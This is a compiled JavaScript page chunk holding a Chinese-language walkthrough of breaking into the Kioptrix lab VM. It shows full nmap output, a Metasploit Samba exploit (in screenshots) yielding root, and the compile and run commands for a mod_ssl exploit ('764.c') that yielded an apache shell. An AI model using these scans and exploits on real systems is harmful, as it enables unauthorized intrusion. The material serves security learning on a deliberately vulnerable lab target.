(window.webpackJsonp=window.webpackJsonp||[]).push([[55],{791:function(s,n,a){"use strict";a.r(n);var e=a(1),t=Object(e.a)({},(function(){var s=this,n=s.$createElement,a=s._self._c||n;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"_0x01-扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-扫描"}},[s._v("#")]),s._v(" 0x01 扫描")]),s._v(" "),a("p",[s._v("扫描IP，发现主机IP")]),s._v(" "),a("p",[s._v("192.168.56.104")]),s._v(" "),a("p",[s._v("扫描端口")]),s._v(" "),a("p",[a("code",[s._v("nmap -T5 -A -v -p- 192.168.56.104")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("└─$ nmap -T5 -A -v -p- 192.168.56.104  \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 00:14 EDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating Ping Scan at 00:14\nScanning 192.168.56.104 [2 ports]\nCompleted Ping Scan at 00:14, 0.00s elapsed (1 total hosts)\nmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers\nInitiating Connect Scan at 00:14\nScanning 192.168.56.104 [65535 ports]\nDiscovered open port 443/tcp on 192.168.56.104\nDiscovered open port 111/tcp on 192.168.56.104\nDiscovered open port 80/tcp on 192.168.56.104\nDiscovered open port 139/tcp on 192.168.56.104\nDiscovered open port 22/tcp on 192.168.56.104\nDiscovered open port 1024/tcp on 192.168.56.104\nCompleted Connect Scan at 00:14, 4.34s elapsed (65535 total ports)\nInitiating Service scan at 00:14\nScanning 6 services on 192.168.56.104\nCompleted Service scan at 00:14, 11.01s elapsed (6 services on 1 host)\nNSE: Script scanning 192.168.56.104.\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 10.42s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 1.15s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nNmap scan report for 192.168.56.104\nHost is up (0.00031s latency).\nNot shown: 65529 closed tcp ports (conn-refused)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| ssh-hostkey: \n|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)\n|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)\n|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)\n|_sshv1: Server supports SSHv1\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-title: Test Page for the Apache Web Server on Red Hat Linux\n| http-methods: \n|   Supported Methods: GET HEAD OPTIONS TRACE\n|_  Potentially risky methods: TRACE\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: md5WithRSAEncryption\n| Not valid before: 2009-09-26T09:32:06\n| Not valid after:  2010-09-26T09:32:06\n| MD5:   78ce 5293 4723 e7fe c28d 74ab 42d7 02f1\n|_SHA-1: 9c42 91c3 bed2 a95b 983d 10ac f766 ecb9 8766 1d33\n|_ssl-date: 2022-03-21T17:14:49+00:00; +12h59m59s from scanner time.\n| http-methods: \n|_  Supported Methods: GET HEAD POST\n| sslv2: \n|   SSLv2 supported\n|   ciphers: \n|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5\n|     SSL2_RC4_128_EXPORT40_WITH_MD5\n|     SSL2_RC4_128_WITH_MD5\n|     SSL2_DES_64_CBC_WITH_MD5\n|     SSL2_RC4_64_WITH_MD5\n|     SSL2_RC2_128_CBC_WITH_MD5\n|_    SSL2_DES_192_EDE3_CBC_WITH_MD5\n|_http-title: 400 Bad Request\n1024/tcp open  status      1 (RPC #100024)\n\nHost script results:\n|_clock-skew: 12h59m58s\n|_smb2-time: Protocol negotiation failed (SMB2)\n| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| Names:\n|   KIOPTRIX<00>         Flags: <unique><active>\n|   KIOPTRIX<03>         Flags: <unique><active>\n|   KIOPTRIX<20>         Flags: <unique><active>\n|   \\x01\\x02__MSBROWSE__\\x02<01>  Flags: <group><active>\n|   MYGROUP<00>          Flags: <group><active>\n|   MYGROUP<1d>          Flags: <unique><active>\n|_  MYGROUP<1e>          Flags: <group><active>\n\nNSE: Script Post-scanning.\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nInitiating NSE at 00:14\nCompleted NSE at 00:14, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 27.20 seconds\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br"),a("span",{staticClass:"line-number"},[s._v("38")]),a("br"),a("span",{staticClass:"line-number"},[s._v("39")]),a("br"),a("span",{staticClass:"line-number"},[s._v("40")]),a("br"),a("span",{staticClass:"line-number"},[s._v("41")]),a("br"),a("span",{staticClass:"line-number"},[s._v("42")]),a("br"),a("span",{staticClass:"line-number"},[s._v("43")]),a("br"),a("span",{staticClass:"line-number"},[s._v("44")]),a("br"),a("span",{staticClass:"line-number"},[s._v("45")]),a("br"),a("span",{staticClass:"line-number"},[s._v("46")]),a("br"),a("span",{staticClass:"line-number"},[s._v("47")]),a("br"),a("span",{staticClass:"line-number"},[s._v("48")]),a("br"),a("span",{staticClass:"line-number"},[s._v("49")]),a("br"),a("span",{staticClass:"line-number"},[s._v("50")]),a("br"),a("span",{staticClass:"line-number"},[s._v("51")]),a("br"),a("span",{staticClass:"line-number"},[s._v("52")]),a("br"),a("span",{staticClass:"line-number"},[s._v("53")]),a("br"),a("span",{staticClass:"line-number"},[s._v("54")]),a("br"),a("span",{staticClass:"line-number"},[s._v("55")]),a("br"),a("span",{staticClass:"line-number"},[s._v("56")]),a("br"),a("span",{staticClass:"line-number"},[s._v("57")]),a("br"),a("span",{staticClass:"line-number"},[s._v("58")]),a("br"),a("span",{staticClass:"line-number"},[s._v("59")]),a("br"),a("span",{staticClass:"line-number"},[s._v("60")]),a("br"),a("span",{staticClass:"line-number"},[s._v("61")]),a("br"),a("span",{staticClass:"line-number"},[s._v("62")]),a("br"),a("span",{staticClass:"line-number"},[s._v("63")]),a("br"),a("span",{staticClass:"line-number"},[s._v("64")]),a("br"),a("span",{staticClass:"line-number"},[s._v("65")]),a("br"),a("span",{staticClass:"line-number"},[s._v("66")]),a("br"),a("span",{staticClass:"line-number"},[s._v("67")]),a("br"),a("span",{staticClass:"line-number"},[s._v("68")]),a("br"),a("span",{staticClass:"line-number"},[s._v("69")]),a("br"),a("span",{staticClass:"line-number"},[s._v("70")]),a("br"),a("span",{staticClass:"line-number"},[s._v("71")]),a("br"),a("span",{staticClass:"line-number"},[s._v("72")]),a("br"),a("span",{staticClass:"line-number"},[s._v("73")]),a("br"),a("span",{staticClass:"line-number"},[s._v("74")]),a("br"),a("span",{staticClass:"line-number"},[s._v("75")]),a("br"),a("span",{staticClass:"line-number"},[s._v("76")]),a("br"),a("span",{staticClass:"line-number"},[s._v("77")]),a("br"),a("span",{staticClass:"line-number"},[s._v("78")]),a("br"),a("span",{staticClass:"line-number"},[s._v("79")]),a("br"),a("span",{staticClass:"line-number"},[s._v("80")]),a("br"),a("span",{staticClass:"line-number"},[s._v("81")]),a("br"),a("span",{staticClass:"line-number"},[s._v("82")]),a("br"),a("span",{staticClass:"line-number"},[s._v("83")]),a("br"),a("span",{staticClass:"line-number"},[s._v("84")]),a("br"),a("span",{staticClass:"line-number"},[s._v("85")]),a("br"),a("span",{staticClass:"line-number"},[s._v("86")]),a("br"),a("span",{staticClass:"line-number"},[s._v("87")]),a("br"),a("span",{staticClass:"line-number"},[s._v("88")]),a("br"),a("span",{staticClass:"line-number"},[s._v("89")]),a("br"),a("span",{staticClass:"line-number"},[s._v("90")]),a("br"),a("span",{staticClass:"line-number"},[s._v("91")]),a("br"),a("span",{staticClass:"line-number"},[s._v("92")]),a("br"),a("span",{staticClass:"line-number"},[s._v("93")]),a("br"),a("span",{staticClass:"line-number"},[s._v("94")]),a("br"),a("span",{staticClass:"line-number"},[s._v("95")]),a("br"),a("span",{staticClass:"line-number"},[s._v("96")]),a("br"),a("span",{staticClass:"line-number"},[s._v("97")]),a("br"),a("span",{staticClass:"line-number"},[s._v("98")]),a("br"),a("span",{staticClass:"line-number"},[s._v("99")]),a("br"),a("span",{staticClass:"line-number"},[s._v("100")]),a("br"),a("span",{staticClass:"line-number"},[s._v("101")]),a("br"),a("span",{staticClass:"line-number"},[s._v("102")]),a("br"),a("span",{staticClass:"line-number"},[s._v("103")]),a("br"),a("span",{staticClass:"line-number"},[s._v("104")]),a("br"),a("span",{staticClass:"line-number"},[s._v("105")]),a("br"),a("span",{staticClass:"line-number"},[s._v("106")]),a("br"),a("span",{staticClass:"line-number"},[s._v("107")]),a("br"),a("span",{staticClass:"line-number"},[s._v("108")]),a("br")])]),a("h2",{attrs:{id:"_0x02-方法一"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-方法一"}},[s._v("#")]),s._v(" 0x02 方法一")]),s._v(" "),a("p",[s._v("发现samba，使用smbclinet没有扫出来版本，使用msf扫描发现版本")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181220010.png",alt:"image-20220415181220010"}})]),s._v(" "),a("p",[s._v("搜索exp发现")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181234735.png",alt:"image-20220415181234735"}})]),s._v(" "),a("p",[s._v("使用msf利用")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181245923.png",alt:"image-20220415181245923"}})]),s._v(" "),a("p",[s._v("尝试payload，修改LHOST后利用成功，获得root权限")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181255633.png",alt:"image-20220415181255633"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181300663.png",alt:"image-20220415181300663"}})]),s._v(" "),a("h2",{attrs:{id:"_0x03-方法二"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-方法二"}},[s._v("#")]),s._v(" 0x03 方法二")]),s._v(" "),a("p",[s._v("​\t使用nikto扫描")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181311227.png",alt:"image-20220415181311227"}})]),s._v(" "),a("p",[s._v("发现mod_ssl存在问题，搜索exp")]),s._v(" "),a("p",[a("img",{attrs:{src:"/assets/img/image-20220415181318656.png",alt:"image-20220415181318656"}})]),s._v(" "),a("p",[s._v("尝试使用764")]),s._v(" "),a("p",[s._v("还需要安装libssl-dev:")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("apt-get install libssl-dev\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("编译764.c")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("gcc -o 764 764.c -lcrypto\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("执行exp")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("./764 0x6b 192.168.56.104 443 -c 50\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("因为网络问题，目标机无法下载COMMAND2下载提权代码，所以只获得apache权限，正常情况下可以直接获得root权限")])])}),[],!1,null,null,null);n.default=t.exports}}]);